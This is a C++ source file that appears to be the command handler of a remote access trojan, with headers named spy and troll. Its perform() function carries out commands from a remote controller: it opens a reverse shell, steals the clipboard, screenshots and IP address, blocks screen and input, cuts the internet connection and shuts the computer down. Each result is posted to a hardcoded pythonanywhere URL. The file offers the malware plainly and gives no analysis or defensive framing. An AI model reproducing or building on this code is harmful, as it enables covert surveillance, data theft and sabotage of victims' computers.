#include <iostream>

#include "filesystem.hh"
#include "spy.hh"
#include "troll.hh"
#include "filesystem.hh"
#include "other.hh"

#include "include/json.hpp"

#pragma once

/*
whats done
rshell
gip
cboard
bscreen
binput
offnet
killpc
cd
ls
ss
*/

#define OUTPUTS_URL "http://0x3af72.pythonanywhere.com/outputs/?u="

void perform(std::string id, std::vector<std::string> values) {

    std::string type = values[1];

    if (type == "rshell") {
        post_request(OUTPUTS_URL + id, {
            {"instruction_id", values[0]},
            {"type", type},
            {"data", reverse_shell(values[2])}
        });
    }

    else if (type == "gip") {
        post_request(OUTPUTS_URL + id, {
            {"instruction_id", values[0]},
            {"type", type},
            {"data", grab_ip()}
        });
    }

    else if (type == "cboard") {
        post_request(OUTPUTS_URL + id, {
            {"instruction_id", values[0]},
            {"type", type},
            {"data", grab_clipboard()}
        });
    }

    else if (type == "ss") {
        post_request(OUTPUTS_URL + id, {
            {"instruction_id", values[0]},
            {"type", type},
            {"data", grab_screenshot()}
        });
    }

    else if (type == "bscreen") {
        post_request(OUTPUTS_URL + id, {
            {"instruction_id", values[0]},
            {"type", type},
            {"data", "success"}
        });
        block_screen(atoi(values[2].c_str()));
    }

    else if (type == "binput") {
        post_request(OUTPUTS_URL + id, {
            {"instruction_id", values[0]},
            {"type", type},
            {"data", "success"}
        });
        block_input(atoi(values[2].c_str()));
    }

    else if (type == "offnet") {
        post_request(OUTPUTS_URL + id, {
            {"instruction_id", values[0]},
            {"type", type},
            {"data", "success"}
        });
        kill_internet(atoi(values[2].c_str()));
    }

    else if (type == "killpc") {
        post_request(OUTPUTS_URL + id, {
            {"instruction_id", values[0]},
            {"type", type},
            {"data", "success"}
        });
        kill_computer();
    }

    else if (type == "cd") {
        post_request(OUTPUTS_URL + id, {
            {"instruction_id", values[0]},
            {"type", type},
            {"data", change_directory(values[2]) ? "success" : "fail"}
        });
    }

    else if (type == "ls") {
        std::string data;
        for (std::string entry: list_directory()) {
            data += entry + "\n";
        }
        data = data.substr(0, data.size() - 1);
        post_request(OUTPUTS_URL + id, {
            {"instruction_id", values[0]},
            {"type", type},
            {"data", data}
        });
    }
}